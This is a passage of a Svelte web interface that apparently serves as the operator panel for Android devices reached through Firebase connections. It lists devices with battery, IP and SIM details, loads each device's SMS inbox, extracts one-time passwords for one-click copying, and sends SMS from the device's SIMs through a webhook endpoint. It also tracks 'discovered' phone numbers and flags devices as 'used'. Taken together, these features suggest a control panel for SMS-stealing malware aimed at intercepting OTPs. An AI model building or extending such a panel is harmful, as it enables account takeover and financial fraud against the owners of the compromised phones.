                        aria-label="Copy device ID"
                        onclick={(e) => {
                          e.stopPropagation();
                          copyText(d.key);
                          toast("Device ID copied", "success");
                        }}
                      >
                        <svg
                          width="11"
                          height="11"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          ><rect
                            x="9"
                            y="9"
                            width="13"
                            height="13"
                            rx="2"
                          /><path
                            d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                          /></svg
                        >
                      </button>
                    </div>
                    <!-- Phone + SIM + last SMS row -->
                    <div class="dev-card-sub">
                      {#if fp}
                        <button
                          class="dev-card-phone-btn"
                          title="Copy number ({extractNumber(fp)})"
                          aria-label="Copy phone number"
                          onclick={(e) => {
                            e.stopPropagation();
                            copyPhone(fp);
                            markCopied(d.connId, d.key);
                          }}
                        >{fp}</button>
                      {:else}
                        <span class="dev-card-no-num">{d.conn.name}</span>
                      {/if}
                      {#if sc}<span class="dev-card-sim">{sc}S</span>{/if}
                      {#if lastMsgFmt}
                        <span class="dev-card-last-sms" title="Last SMS received: {new Date(lastMsgTs).toLocaleString()}">📨 {lastMsgFmt}</span>
                      {/if}
                    </div>
                  </div>
                  <!-- Right: battery + arrow -->
                  <div class="dev-card-right">
                    {#if bat !== null}
                      <span
                        class="dev-card-bat"
                        style="background:{batColor(bat)}15;color:{batColor(
                          bat,
                        )};border:1px solid {batColor(bat)}44">{bat}%</span
                      >
                    {/if}
                    <svg
                      class="dev-card-arrow"
                      width="14"
                      height="14"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2.5"><path d="M9 18l6-6-6-6" /></svg
                    >
                  </div>
                </div>
              {/each}
              {#if filteredTableDevices.length === 0}
                <div class="dt-empty">
                  No devices match the selected filters
                </div>
              {/if}
            </div>
          </div>
          <!-- Bottom pagination bar — always visible -->
          <div class="pag-bar">
            <div class="pag-group-left">
              <span class="pag-summary">
                Showing <strong
                  >{filteredTableDevices.length === 0
                    ? 0
                    : devicePage * DEVICES_PER_PAGE + 1}–{Math.min(
                    (devicePage + 1) * DEVICES_PER_PAGE,
                    filteredTableDevices.length,
                  )}</strong
                >
                of <strong>{filteredTableDevices.length}</strong>
              </span>
            </div>
            <div class="pag-group-controls">
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage === 0}
                onclick={() => setDevicePage(0)}
                aria-label="First page"
                title="First page"
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><polyline points="11 17 6 12 11 7" /><polyline
                    points="18 17 13 12 18 7"
                  /></svg
                >
                <span class="pag-btn-txt">First</span>
              </button>
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage === 0}
                onclick={() => setDevicePage(devicePage - 1)}
                aria-label="Previous page"
                title="Previous page"
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"><polyline points="15 18 9 12 15 6" /></svg
                >
                <span class="pag-btn-txt">Prev</span>
              </button>
              <div class="pag-nums">
                {#if totalDevicePages <= 7}
                  {#each Array(totalDevicePages) as _, idx}
                    <button
                      class="pag-btn pag-num {devicePage === idx
                        ? 'active'
                        : ''}"
                      onclick={() => setDevicePage(idx)}
                      aria-label="Page {idx + 1}"
                      aria-current={devicePage === idx ? "page" : undefined}
                    >
                      {idx + 1}
                    </button>
                  {/each}
                {:else}
                  <span class="pag-info-badge">
                    Page <strong>{devicePage + 1}</strong> /
                    <strong>{totalDevicePages}</strong>
                  </span>
                {/if}
              </div>
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage >= totalDevicePages - 1}
                onclick={() => setDevicePage(devicePage + 1)}
                aria-label="Next page"
                title="Next page"
              >
                <span class="pag-btn-txt">Next</span>
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"><polyline points="9 18 15 12 9 6" /></svg
                >
              </button>
              <button
                class="pag-btn pag-btn-nav"
                disabled={devicePage >= totalDevicePages - 1}
                onclick={() => setDevicePage(totalDevicePages - 1)}
                aria-label="Last page"
                title="Last page"
              >
                <span class="pag-btn-txt">Last</span>
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><polyline points="13 17 18 12 13 7" /><polyline
                    points="6 17 11 12 6 7"
                  /></svg
                >
              </button>
            </div>
          </div>
        </div>

        <!-- ── DEVICE ────────────────────────────────────────────────────── -->
      {:else if activeTab === "device"}
        {#if !selectedKey}
          <div class="no-sel">Select a device from the sidebar</div>
        {:else}
          {@const on = selectedInfo ? isOnline(selectedInfo) : null}
          {@const bat = selectedInfo ? getBattery(selectedInfo) : null}

          <!-- Device header -->
          <div class="dv-card">
            <div class="dv-left">
              <div class="dv-ico">
                <svg
                  width="26"
                  height="26"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  opacity="0.7"
                >
                  <rect x="5" y="2" width="14" height="20" rx="2" /><path
                    d="M12 18h.01"
                  />
                </svg>
              </div>
              <div>
                <div class="dv-id mono">{selectedKey}</div>
                <div
                  style="display:flex;gap:8px;align-items:center;margin-top:6px;flex-wrap:wrap"
                >
                  {#if on !== null}
                    <span class="ob {on ? 'ob-on' : 'ob-off'}"
                      >{on ? "Online" : "Offline"}</span
                    >
                  {:else}
                    <span class="ob ob-unk">No device info</span>
                  {/if}
                  {#if selectedConn}
                    <span style="font-size:12px;color:{selectedConn.color}"
                      >· {selectedConn.name}</span
                    >
                  {/if}
                </div>
              </div>
            </div>
            <div class="dv-right-meta">
              {#if bat !== null}
                <div class="dv-bat">
                  <div class="dv-bat-n" style="color:{batColor(bat)}">{bat}%</div>
                  <div class="dv-bat-l">BATTERY</div>
                  <div class="bat-track">
                    <div
                      class="bat-fill"
                      style="width:{bat}%;background:{batColor(bat)}"
                    ></div>
                  </div>
                </div>
              {/if}
              <button
                type="button"
                class="dv-sec-toggle-btn"
                onclick={toggleDevInfo}
                title={devInfoOpen ? "Collapse device details" : "Expand device details"}
                aria-expanded={devInfoOpen}
              >
                <span class="dv-toggle-label">{devInfoOpen ? "Less" : "Details"}</span>
                <svg
                  class="inline-sec-chevron {devInfoOpen ? 'rotated' : ''}"
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>
          </div>

          <!-- Info grid -->
          {#if devInfoOpen}
          {@const dispPhone = getDisplayPhone(
            selectedConnId,
            selectedKey,
            selectedInfo,
          )}
          {#if selectedInfo || dispPhone}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId === selectedConnId && editingPhone.key === selectedKey}
                  <div class="phone-edit-row">
                    <input
                      class="phone-edit-in"
                      bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={(e) => e.key === "Enter" && commitPhone()}
                      aria-label="Phone number"
                    />
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}
                      >Save</button
                    >
                    <button
                      class="btn btn-ghost btn-sm"
                      onclick={() => (editingPhone = null)}>✕</button
                    >
                  </div>
                {:else}
                  <div
                    class="ib-v"
                    style="display:flex;align-items:center;gap:6px;flex-wrap:wrap"
                  >
                    {#if dispPhone}
                      <button
                        class="dev-card-phone-btn"
                        style="font-size:13px"
                        onclick={() => copyPhone(dispPhone)}
                        title="Click to copy number"
                      >{dispPhone}</button>
                      <button
                        class="af-cp"
                        onclick={() => {
                          copyPhone(dispPhone);
                        }}
                        title="Copy 10-digit number"
                        aria-label="Copy number"
                      >
                        <svg
                          width="10"
                          height="10"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          ><rect
                            x="9"
                            y="9"
                            width="13"
                            height="13"
                            rx="2"
                          /><path
                            d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                          /></svg
                        >
                      </button>
                    {:else}
                      <span>—</span>
                    {/if}
                    <button
                      class="edit-ph-btn"
                      onclick={() =>
                        startEditPhone(selectedConnId, selectedKey)}
                      title="Edit local number"
                      aria-label="Edit phone"
                    >
                      {dispPhone ? "✏️" : "+ Add number"}
                    </button>
                  </div>
                {/if}
              </div>
              <div class="ib">
                <div class="ib-l">IP</div>
                <div class="ib-v mono">
                  {selectedInfo ? (getIp(selectedInfo) ?? "—") : "—"}
                </div>
              </div>
              <div class="ib">
                <div class="ib-l">ANDROID</div>
                <div class="ib-v">
                  {selectedInfo ? (getAndroid(selectedInfo) ?? "—") : "—"}
                </div>
              </div>
              <div class="ib">
                <div class="ib-l">SIMS</div>
                <div class="ib-v">
                  {selectedInfo ? (getSims(selectedInfo) ?? 0) : 0}
                </div>
              </div>
            </div>
          {:else}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId === selectedConnId && editingPhone.key === selectedKey}
                  <div class="phone-edit-row">
                    <input
                      class="phone-edit-in"
                      bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={(e) => e.key === "Enter" && commitPhone()}
                      aria-label="Phone number"
                    />
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}
                      >Save</button
                    >
                    <button
                      class="btn btn-ghost btn-sm"
                      onclick={() => (editingPhone = null)}>✕</button
                    >
                  </div>
                {:else}
                  <div class="ib-v">
                    <button
                      class="edit-ph-btn add-ph"
                      onclick={() =>
                        startEditPhone(selectedConnId, selectedKey)}
                      >+ Add local number</button
                    >
                  </div>
                {/if}
              </div>
              <div class="ib">
                <div class="ib-l">IP</div>
                <div class="ib-v" style="color:#334155">—</div>
              </div>
              <div class="ib">
                <div class="ib-l">ANDROID</div>
                <div class="ib-v" style="color:#334155">—</div>
              </div>
              <div class="ib">
                <div class="ib-l">SIMS</div>
                <div class="ib-v" style="color:#334155">—</div>
              </div>
            </div>
          {/if}
          {/if}

          {@const devUsedDetail = isUsed(`dev::${selectedConnId}::${selectedKey}`)}
          <!-- Device nav bar (prev/next within filtered list) -->
          <div class="dev-nav-bar">
            <button
              class="dev-nav-btn"
              disabled={selectedDeviceIndex <= 0}
              onclick={() => navToDevice(-1)}
              title="Previous device"
              aria-label="Previous device"
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
              Prev
            </button>
            <span class="dev-nav-pos">
              {selectedDeviceIndex >= 0 ? selectedDeviceIndex + 1 : '–'}
              <span class="dev-nav-sep">/</span>
              {filteredTableDevices.length}
            </span>
            <button
              class="dev-nav-btn"
              disabled={selectedDeviceIndex < 0 || selectedDeviceIndex >= filteredTableDevices.length - 1}
              onclick={() => navToDevice(1)}
              title="Next device"
              aria-label="Next device"
            >
              Next
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
            </button>
          </div>

          <!-- Device used checkbox -->
          <div class="dev-used-row">
            <label class="dev-used-label" for="dev-used-chk">
              <input
                id="dev-used-chk"
                type="checkbox"
                class="dev-check"
                checked={devUsedDetail}
                onchange={() =>
                  toggleUsed(`dev::${selectedConnId}::${selectedKey}`)}
                aria-label="Mark device used"
              />
              <span>{devUsedDetail ? "✓ Marked as Used" : "Mark as Used"}</span>
            </label>
          </div>

          <!-- ── Inline Messages ───────────────────────────────────────────── -->
          <div class="inline-section {messagesOpen ? 'is-open' : 'is-closed'}">
            <div class="inline-sec-hdr inline-sec-hdr-msg">
              <button
                type="button"
                class="inline-sec-title-btn"
                onclick={toggleMessages}
                aria-expanded={messagesOpen}
                title={messagesOpen ? "Collapse messages" : "Expand messages"}
              >
                <span class="inline-sec-title">💬 Messages</span>
                {#if filteredMsgs && filteredMsgs.length > 0}
                  <span class="inline-sec-cnt-badge">{filteredMsgs.length}</span>
                {/if}
                <svg
                  class="inline-sec-chevron {messagesOpen ? 'rotated' : ''}"
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>

              <div class="inline-sec-hdr-actions">
                {#if messagesOpen}
                  <div class="msg-tabs">
                    <button class="mtab {msgsFilter === 'all' ? 'mta' : ''}" onclick={() => (msgsFilter = 'all')}>All</button>
                    <button class="mtab {msgsFilter === 'in' ? 'mti' : ''}" onclick={() => (msgsFilter = 'in')}>In</button>
                    <button class="mtab {msgsFilter === 'out' ? 'mto' : ''}" onclick={() => (msgsFilter = 'out')}>Out</button>
                  </div>
                  <button class="btn btn-ghost btn-sm inline-refresh-btn" onclick={loadMessages} title="Load / refresh messages">↻</button>
                {:else}
                  <button
                    type="button"
                    class="inline-expand-hint-btn"
                    onclick={() => (messagesOpen = true)}
                  >
                    Open
                  </button>
                {/if}
              </div>
            </div>

            {#if messagesOpen}
              {#if msgsLoading}
                <div class="no-sel" style="min-height:80px"><div class="spin-ring"></div></div>
              {:else if msgs === null}
                <div class="inline-empty">
                  <p class="inline-empty-hint">Messages have not been loaded yet</p>
                  <button class="act-btn ab-msg inline-load-btn" onclick={loadMessages}>
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                    Load Messages
                  </button>
                </div>
              {:else if filteredMsgs.length === 0}
                <div class="inline-empty" style="color:#475569">No messages{msgsSearch || msgsFilter !== 'all' ? ' for this filter' : ''}</div>
              {:else}
                <div class="msg-list inline-msg-scroll">
                  {#each filteredMsgs as [id, msg]}
                    {@const msgText = msg.message ?? msg.body ?? msg.text ?? ''}
                    {@const otp = extractOTP(msgText)}
                    <div class="msg-card">
                      <div class="mc-row">
                        {#if extractNumber(msg.sender ?? msg.from)}
                          <button class="mc-sender-btn" onclick={() => copyPhone(msg.sender ?? msg.from)} title="Copy number">{msg.sender ?? msg.from}</button>
                        {:else}
                          <span class="mc-sender">{msg.sender ?? msg.from ?? 'Unknown'}</span>
                        {/if}
                        <span class="mc-badge {(msg.type || 'incoming') === 'incoming' ? 'badge-in' : 'badge-out'}">
                          {(msg.type || 'incoming') === 'incoming' ? 'Incoming' : 'Outgoing'}
                        </span>
                      </div>
                      <div class="mc-body">{msgText.slice(0, 80)}{msgText.length > 80 ? '…' : ''}</div>
                      {#if otp}
                        <div class="mc-otp" role="button" tabindex="0"
                          onclick={() => { copyText(otp); toast(`OTP ${otp} copied!`, 'success'); }}
                          onkeydown={(e) => e.key === 'Enter' && (copyText(otp), toast(`OTP ${otp} copied!`, 'success'))}
                          title="Click to copy OTP">
                          <span class="otp-label">OTP</span>
                          <code class="otp-code">{otp}</code>
                          <span class="otp-copy-hint"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></span>
                        </div>
                      {/if}
                      <div class="mc-foot">
                        {#if msg.dateTime}<span class="mc-dt">{toIST(msg.dateTime)}</span>{/if}
                        <button class="af-cp" onclick={() => copyText(msgText)} title="Copy full message" aria-label="Copy message">
                          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        </button>
                      </div>
                    </div>
                  {/each}
                </div>
              {/if}
            {/if}
          </div>

          <!-- ── Inline Send SMS ────────────────────────────────────────────── -->
          <div class="inline-section {sendSmsOpen ? 'is-open' : 'is-closed'}">
            <button
              type="button"
              class="inline-sec-hdr inline-sec-hdr-btn"
              onclick={toggleSendSms}
              aria-expanded={sendSmsOpen}
            >
              <div class="inline-sec-hdr-left">
                <span class="inline-sec-title">🚀 Send SMS</span>
                {#if smsDraft.to.trim()}
                  <span class="inline-sec-badge">Draft: {smsDraft.to.trim()}</span>
                {/if}
              </div>
              <div class="inline-sec-hdr-right">
                <span class="inline-sec-action-hint">{sendSmsOpen ? 'Close' : 'Open'}</span>
                <svg
                  class="inline-sec-chevron {sendSmsOpen ? 'rotated' : ''}"
                  width="15"
                  height="15"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </div>
            </button>
            {#if sendSmsOpen}
              <div class="inline-form-body">
                <div class="send-form" style="margin-top:0">
                  <div class="field">
                    <label for="di-sms-to">To (phone number)</label>
                    <input id="di-sms-to" bind:value={smsDraft.to} placeholder="+91 XXXXX XXXXX" />
                  </div>
                  <div class="field">
                    <label for="di-sms-sim">SIM Slot</label>
                    <select id="di-sms-sim" bind:value={smsDraft.sim} class="tiny-sel" style="font-size:13px;padding:7px 10px;">
                      <option value="0">SIM 1 (Slot 0)</option>
                      <option value="1">SIM 2 (Slot 1)</option>
                    </select>
                  </div>
                  <div class="field">
                    <label for="di-sms-msg">Message</label>
                    <textarea id="di-sms-msg" rows="3" bind:value={smsDraft.body} placeholder="Type your message…"></textarea>
                  </div>
                  <button class="act-btn ab-snd inline-send-btn" onclick={doSendSMS} disabled={smsSending || !smsDraft.to.trim() || !smsDraft.body.trim()}>
                    {#if smsSending}<span class="spin-ring" style="width:13px;height:13px;border-width:2px"></span>{:else}🚀 Send SMS{/if}
                  </button>
                </div>
              </div>
            {/if}
          </div>
        {/if}

        <!-- ── MESSAGES ───────────────────────────────────────────────────── -->
      {:else if activeTab === "messages"}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else if msgsLoading}
          <div class="no-sel">
            <div class="spin-ring"></div>
            <p>Loading messages…</p>
          </div>
        {:else if msgs === null}
          <div class="no-sel">
            <p>
              Click to load messages for <code class="mono">{selectedKey}</code>
            </p>
            <button class="btn btn-primary" onclick={loadMessages}
              >Load Messages</button
            >
          </div>
        {:else}
          <div class="msg-topbar">
            <span class="msg-count">{filteredMsgs.length} / 50 messages</span>
            <div class="msg-search-wrap">
              <svg
                width="12"
                height="12"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                opacity="0.4"
                ><circle cx="11" cy="11" r="8" /><path
                  d="m21 21-4.35-4.35"
                /></svg
              >
              <input
                class="msg-search"
                bind:value={msgsSearch}
                placeholder="Search messages…"
                aria-label="Search messages"
              />
            </div>
            <div class="msg-tabs">
              <button
                class="mtab {msgsFilter === 'all' ? 'mta' : ''}"
                onclick={() => (msgsFilter = "all")}>All</button
              >
              <button
                class="mtab {msgsFilter === 'in' ? 'mti' : ''}"
                onclick={() => (msgsFilter = "in")}>In</button
              >
              <button
                class="mtab {msgsFilter === 'out' ? 'mto' : ''}"
                onclick={() => (msgsFilter = "out")}>Out</button
              >
            </div>
            <button class="btn btn-ghost btn-sm" onclick={loadMessages}
              >↻</button
            >
          </div>

          {#if filteredMsgs.length === 0}
            <div class="no-sel" style="min-height:200px">
              <p style="color:#475569">
                No messages found{msgsSearch || msgsFilter !== "all"
                  ? " for this filter"
                  : ""}
              </p>
            </div>
          {:else}
            <div class="msg-list">
              {#each filteredMsgs as [id, msg]}
                {@const msgText = msg.message ?? msg.body ?? msg.text ?? ""}
                {@const otp = extractOTP(msgText)}
                <div class="msg-card">
                  <div class="mc-row">
                    {#if extractNumber(msg.sender ?? msg.from)}
                      <button
                        class="mc-sender-btn"
                        onclick={() => copyPhone(msg.sender ?? msg.from)}
                        title="Click to copy number ({extractNumber(msg.sender ?? msg.from)})"
                      >{msg.sender ?? msg.from}</button>
                    {:else}
                      <span class="mc-sender">{msg.sender ?? msg.from ?? "Unknown"}</span>
                    {/if}
                    <span
                      class="mc-badge {(msg.type || 'incoming') === 'incoming'
                        ? 'badge-in'
                        : 'badge-out'}"
                    >
                      {(msg.type || "incoming") === "incoming"
                        ? "Incoming"
                        : "Outgoing"}
                    </span>
                  </div>
                  <div class="mc-body">
                    {msgText.slice(0, 80)}{msgText.length > 80 ? "…" : ""}
                  </div>
                  {#if otp}
                    <div
                      class="mc-otp"
                      role="button"
                      tabindex="0"
                      onclick={() => {
                        copyText(otp);
                        toast(`OTP ${otp} copied!`, "success");
                      }}
                      onkeydown={(e) =>
                        e.key === "Enter" &&
                        (copyText(otp), toast(`OTP ${otp} copied!`, "success"))}
                      title="Click to copy OTP"
                    >
                      <span class="otp-label">OTP</span>
                      <code class="otp-code">{otp}</code>
                      <span class="otp-copy-hint">
                        <svg
                          width="11"
                          height="11"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          ><rect
                            x="9"
                            y="9"
                            width="13"
                            height="13"
                            rx="2"
                          /><path
                            d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                          /></svg
                        >
                      </span>
                    </div>
                  {/if}
                  <div class="mc-foot">
                    {#if msg.dateTime}<span class="mc-dt"
                        >{toIST(msg.dateTime)}</span
                      >{/if}
                    <button
                      class="af-cp"
                      onclick={() => copyText(msgText)}
                      title="Copy full message"
                      aria-label="Copy message"
                    >
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                        /></svg
                      >
                    </button>
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        {/if}

        <!-- ── SEND SMS ───────────────────────────────────────────────────── -->
      {:else if activeTab === "send"}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else}
          <div class="send-wrap">
            <div class="send-hdr">Send SMS</div>
            <div class="send-sub">
              via <span style="color:{selectedConn?.color}"
                >{selectedConn?.name}</span
              >
              → <code class="mono">{selectedKey}</code>
            </div>
            <div
              class="send-sub"
              style="margin-top:2px;font-size:10.5px;color:#475569;word-break:break-all;"
            >
              📍 <code style="font-size:10px;color:#64748b"
                >{selectedConn?.url}/clients/{selectedKey}/webhookEvent/sendSms</code
              >
            </div>
            <div class="send-form">
              <div class="field">
                <label for="sms-to">To (phone number)</label>
                <input
                  id="sms-to"
                  bind:value={smsDraft.to}
                  placeholder="+91 XXXXX XXXXX"
                />
              </div>
              <div class="field">
                <label for="sms-sim">SIM Slot</label>
                <select
                  id="sms-sim"
                  bind:value={smsDraft.sim}
                  class="tiny-sel"
                  style="font-size:13px;padding:8px 10px;"
                >
                  <option value="0">SIM 1 (Slot 0)</option>
                  <option value="1">SIM 2 (Slot 1)</option>
                </select>
              </div>
              <div class="field">
                <label for="sms-msg">Message</label>
                <textarea
                  id="sms-msg"
                  rows="5"
                  bind:value={smsDraft.body}
                  placeholder="Type your message…"
                ></textarea>
              </div>
              <button
                class="act-btn ab-snd"
                onclick={doSendSMS}
                disabled={smsSending ||
                  !smsDraft.to.trim() ||
                  !smsDraft.body.trim()}
              >
                {#if smsSending}<span
                    class="spin-ring"
                    style="width:14px;height:14px;border-width:2px"
                  ></span>
                {:else}🚀 Send SMS{/if}
              </button>
            </div>
          </div>
        {/if}

      <!-- ── DISCOVERED NUMBERS ─────────────────────────────────────── -->
      {:else if activeTab === 'discovered'}
        <div class="disc-wrap">
          <div class="disc-hdr">
            <div class="disc-hdr-top">
              <h3 class="disc-title">📱 Discovered Numbers</h3>
              <span class="disc-count">{filteredDiscovery.length} of {discoveryRecords.length}</span>
            </div>
            <div class="disc-controls">
              <input type="search" class="disc-search" placeholder="Search device ID, phone, connection…"
                bind:value={discoverySearch} />
              <select class="disc-sort" bind:value={discoverySort}>
                <option value="date-desc">Newest first</option>
                <option value="date-asc">Oldest first</option>
                <option value="conn">By connection</option>
              </select>
              <button class="disc-refresh" onclick={loadDiscoveryRecords} title="Refresh">↻</button>
            </div>
          </div>

          {#if filteredDiscovery.length === 0}
            <div class="disc-empty">
              {#if discoveryRecords.length === 0}
                No discovered numbers yet. Go to <a href="/discovery">Discovery</a> to start.
              {:else}
                No results match "{discoverySearch}"
              {/if}
            </div>
          {:else}
            <div class="disc-list">
              {#each filteredDiscovery as rec (rec.deviceId + rec.discoveredAt)}
                <div class="disc-row">
                  <div class="disc-row-top">
                    <button class="disc-devid" onclick={() => {
                      copyText(rec.deviceId);
                      addToast(rec.deviceId.slice(0, 12) + '… copied', 'success');
                    }}>{rec.deviceId}</button>
                    <span class="disc-arrow">→</span>
                    <button class="disc-phone" onclick={() => {
                      copyText(rec.phoneNumber);
                      addToast(rec.phoneNumber + ' copied', 'success');
                    }}>{rec.phoneNumber}</button>
                  </div>
                  <div class="disc-row-meta">
                    {#if rec.connectionName}
                      <span class="disc-conn">{rec.connectionName}</span>
                    {/if}
                    <span class="disc-method {rec.discoveryMethod === 'manual' ? 'disc-method-manual' : 'disc-method-sms'}">
                      {rec.discoveryMethod === 'manual' ? '✏️ manual' : '📡 sms'}
                    </span>
                    {#if rec.attemptCount > 0}
                      <span class="disc-attempts">{rec.attemptCount}×</span>
                    {/if}
                    <span class="disc-date">
                      {new Date(rec.discoveredAt).toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', timeZone: 'Asia/Kolkata' })}
                      {new Date(rec.discoveredAt).toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true, timeZone: 'Asia/Kolkata' })}
                    </span>
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        </div>
      {/if}
    </div>
  </div>
</div>

<!-- Floating Action Button: Add Firebase (Corner FAB) -->
{#if !addOpen}
  <button
    class="corner-add-fab"
    onclick={openAddPanel}
    title="Add Firebase Connection (Single / Bulk / File / Extract)"
    aria-label="Add Firebase Connection"
  >
    <span class="corner-add-fab-glow"></span>
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <path d="M12 5v14M5 12h14" />
    </svg>
    <span class="corner-add-fab-text">Add Firebase</span>
  </button>
{/if}

<!-- Toasts -->
<div class="toast-stack">
  {#each toasts as t (t.id)}
    <div class="toast {t.type} {t.out ? 'out' : ''}">{t.msg}</div>
  {/each}
</div>

<!-- Mobile Bottom Navigation Bar -->
<nav class="bottom-nav" aria-label="Main navigation">
  <button
    class="bn-item {activeBottomTab === 'dashboard' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("dashboard")}
    aria-label="Dashboard"
    aria-current={activeBottomTab === "dashboard" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <rect x="3" y="3" width="7" height="7" rx="1" /><rect
        x="14"
        y="3"
        width="7"
        height="7"
        rx="1"
      />
      <rect x="14" y="14" width="7" height="7" rx="1" /><rect
        x="3"
        y="14"
        width="7"
        height="7"
        rx="1"
      />
    </svg>
    <span class="bn-label">Dashboard</span>
  </button>
  <button
    class="bn-item {activeBottomTab === 'devices' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("devices")}
    aria-label="Devices"
    aria-current={activeBottomTab === "devices" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <rect x="5" y="2" width="14" height="20" rx="2" /><line
        x1="12"
        y1="18"
        x2="12.01"
        y2="18"
      />
    </svg>
    <span class="bn-label">Devices</span>
  </button>
  {#if showNotifsTab}
    <!-- Notifications bell with badge -->
    <button
      class="bn-item {showBellPanel ? 'bn-active' : ''} bn-notif-wrap"
      onclick={() => setBottomTab("notifs")}
      aria-label="Notifications"
    >
      <div style="position:relative;display:inline-flex">
        {#if notifsEnabled}
          <svg
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
              d="M13.73 21a2 2 0 0 1-3.46 0"
            /></svg
          >
        {:else}
          <svg
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
              d="M13.73 21a2 2 0 0 1-3.46 0"
            /><line x1="2" y1="2" x2="22" y2="22" /></svg
          >
        {/if}
        {#if notifications.length > 0}
          <span class="bn-notif-badge"
            >{notifications.length > 9 ? "9+" : notifications.length}</span
          >
        {/if}
      </div>
      <span class="bn-label">{notifsEnabled ? "Alerts" : "Muted"}</span>
    </button>
  {/if}
  <button
    class="bn-item {activeBottomTab === 'send' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("send")}
    aria-label="Send SMS"
    aria-current={activeBottomTab === "send" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <line x1="22" y1="2" x2="11" y2="13" /><polygon
        points="22 2 15 22 11 13 2 9 22 2"
      />
    </svg>
    <span class="bn-label">Send</span>
  </button>
  <button
